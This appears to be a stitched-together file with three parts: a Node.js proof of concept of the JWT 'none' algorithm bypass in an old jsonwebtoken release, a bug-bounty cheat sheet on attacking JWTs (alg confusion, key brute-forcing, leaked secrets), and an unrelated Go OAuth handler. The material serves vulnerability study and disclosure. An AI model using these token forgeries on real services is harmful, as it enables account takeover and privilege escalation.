// Original research publication:
// https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
//
// Depdency installation command:
// npm i jsonwebtoken@0.2.0
// 
// Node security advisory:
// https://nodesecurity.io/advisories/88
// https://gist.github.com/nstarke/48ca723c2f3a168771ffd796b7cfb432
//
//

const jwt = require('jsonwebtoken');
const secretKey = 'this is a secret key';

// This represents a normal, server signed token issued to the client, perhaps upon successful
// authentication.
var originalToken = jwt.sign({ loggedInAs: 'user', iat: 1422779638 }, secretKey, { algorithm: 'HS256' });

// This represents a normal server side verification of a token sent to the server by the client.
jwt.verify(originalToken, secretKey, function(err, result) {
  console.log('this should pass', result, err);
});

// This represents an abnormally signed token, perhaps created as an attempt to forge a token.
var diffKeyToken = jwt.sign({ loggedInAs: 'user', iat: 1422779638 }, 'different than secret key', { algorithm: 'HS256' });

// This should fail because the key supplied when signing the token doesn't match the secret key
// which only the server knows.
jwt.verify(diffKeyToken, secretKey, function(err, result) {
  console.log('this should fail', result, err);
});

// Here we set the algorithm to 'none', and supply a key which does not match the secret server side
// key. This token could be created somewhere other than the server (where the secret lives) because 
// the secret key doesn't need to be used in order to facilitate a successful verify operation.
// Also, the privilege of the token has been elevated from 'user' to 'admin' to demonstrate how
// this attack might be useful in a practical context.
var noneToken = jwt.sign({ loggedInAs: 'admin', iat: 1422779638 }, '', { algorithm: 'none' });

// Even though the key doesn't match, because the algorithm is set to none, the result of the verify
// operation is success.  This is the vulnerability.
jwt.verify(noneToken, secretKey, function(err, result) {
  console.log('this should fail but will not because of the bug', result, err);
});

// An extraneous case, which explicitly demonstrates that any key can be used with the 'none'
// algorithm and will result in a successful verification.
var noneTokenDiff = jwt.sign({ loggedInAs: 'admin', iat: 1422779638 }, 'different than secret key', { algorithm: 'none' });

// This should not pass, but does because the 'none' algorithm is set.
jwt.verify(noneTokenDiff, secretKey, function(err, result) {
  console.log('this should also fail but will not because of the bug', result, err);
});

//
//

```
//
//  https://gist.github.com/sushiwushi/229237c0a5e5fc0852af622707d005ef

1. Leaked JWT secret keys through JavaScript files
Zendesk is a support system used by many websites, some of them enabled JWT for single sign-on authentication https://support.zendesk.com/hc/en-us/articles/203663816-Enabling-JWT-JSON-Web-Token-single-sign-on

There maybe a possibility that the JWT secret token is leaked in JavaScript files, as shown in the report below
https://hackerone.com/reports/638635

To search for it, grep (Ctrl + F) for "jwt" in website's Zendesk JavaScript files

References
https://jwt.io
https://unixstamp.com
https://www.uuidgenerator.net

2. Breaking JWT encryption
JWT presents as Authorization Bearer token in HTTP requests and can be decrypted to further analyze any vulnerabilities present

(a) Manipulating algorithm
JWT is built from 3 parts which is base64 encoded => b64_encode(header).b64_encode(payload).b64_encode(signature)

The "header" part contains the algorithm it uses to transfer the token, it can be manipulated to bypass the verification from the server. If successful, it can be used to login into anyone's user account.

i. "none" algorithm
Modify the above header to contain {"alg": "none"} instead of "HS256". Make any desired changes to the payload. Use an empty signature (i.e. signature = "").

If a secret key was provided, then token verification will fail for tokens using the none algorithm. 

Reference
https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries

ii. "HS256" algorithm
Modify the header alg to HS256
Copy server certificate and extract the public key

Reference
https://habr.com/en/post/450054
https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6

(b) Manipulating payload
i. IDOR
The JWT token had the session id and user id and signed with HS256, pretty good right but no the api did not validate any of that

https://medium.com/bugbountywriteup/idor-in-jwt-and-the-shortest-token-you-will-ever-see-uid-1234567890-4e02377ea03a

(c) Manipulating signature
i. Cracking HS256 key
If the HS256 key strength is weak, it can be directly brute-forced, such as using the secret string as a key in the PyJWT library sample code

Reference
https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6
https://medium.com/@valeriyshevchenko/brute-forcing-jwt-token-hs256-6f545d24c7c3

ii. Timing attack
https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9

3. Sources
Cheatsheet PDF
https://assets.pentesterlab.com/jwt_security_cheatsheet/jwt_security_cheatsheet.pdf

Blog post about JWT web token analysis
https://mazinahmed.net/blog/breaking-jwt

Payloads
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token

Tools
https://github.com/mazen160/jwt-pwn

//
//
```

func (gp *GithubProvider) HandleLogin(w http.ResponseWriter, r *http.Request) {
	// var user models.User

	// s := sessions.GetSession(r)

	// if val := s.Get("user"); val != nil {

	// 	v := val.([]byte)

	// 	json.Unmarshal(v, &user)

	// 	log.Infof("user already logged in %s provider %s", user.Login, user.Provider)
	// 	http.Redirect(w, r, "/", http.StatusFound)
	// 	return
	// }

	id := uniuri.NewLen(32)
	//	s.Set("state", state)

	token := jwt.New(jwt.GetSigningMethod("HS256"))

	token.Claims["ID"] = id
	token.Claims["exp"] = time.Now().Unix() + 60 // 1 minute

	state, _ := token.SignedString([]byte(gp.Config.JWTSecret))

	http.Redirect(w, r, gp.oauth2Config.AuthCodeURL(state, oauth2.AccessTypeOffline), http.StatusFound)
}

func (gp *GithubProvider) HandleCallback(w http.ResponseWriter, r *http.Request) {
	// s := sessions.GetSession(r)

	// providedState := r.URL.Query().Get("state")
	// originalState := s.Get("state")

	// if providedState != originalState {
	// 	http.Error(w, ProviderInvalidRequest.Error(), http.StatusBadRequest)
	// 	return
	// }

	state := r.URL.Query().Get("state")

	jwtToken, err := jwt.Parse(state, func(token *jwt.Token) (interface{}, error) {
		return []byte(gp.Config.JWTSecret), nil
	})

	if err != nil {
		log.Errorf("Invalid JTW token returned: %s", err)
		http.Error(w, ProviderInvalidRequest.Error(), http.StatusBadRequest)
		return
	}

	if !jwtToken.Valid {
		log.Errorf("JTW token not Valid: %s", state)
		http.Error(w, ProviderInvalidRequest.Error(), http.StatusBadRequest)
		return
	}

	if jwtToken.Claims["ID"] == nil {
		log.Errorf("JTW token missing ID: %v", jwtToken.Claims)
		http.Error(w, ProviderInvalidRequest.Error(), http.StatusBadRequest)
		return
	}

	// retrieve the code
	code := r.URL.Query().Get("code")

	// use the code to retrieve the oauth2 token
	token, err := gp.oauth2Config.Exchange(oauth2.NoContext, code)

	if err != nil {
		http.Error(w, ProviderFailed.Error(), http.StatusInternalServerError)
		return
	}

	user, err := gp.saveOrUpdateUser(token)

	if err != nil {
		log.Errorf("error saving user: %s", err)
		http.Error(w, ProviderFailed.Error(), http.StatusInternalServerError)
		return
	}

	// log.Infof(spew.Sprintf("user %+v", user))

	delete(jwtToken.Claims, "ID")

	jwtToken.Claims["Login"] = user.Login
	jwtToken.Claims["Name"] = user.Github.Name
	jwtToken.Claims["Email"] = user.Github.Email
	jwtToken.Claims["exp"] = time.Now().Unix() + 36000 // 10 hours

	authHeader, _ := jwtToken.SignedString([]byte(gp.Config.JWTSecret))
	w.Header().Add("Authorization", fmt.Sprintf("Bearer %s", authHeader))

	//	http.Redirect(w, r, "/", http.StatusFound)
	w.Write([]byte("Success!"))
}
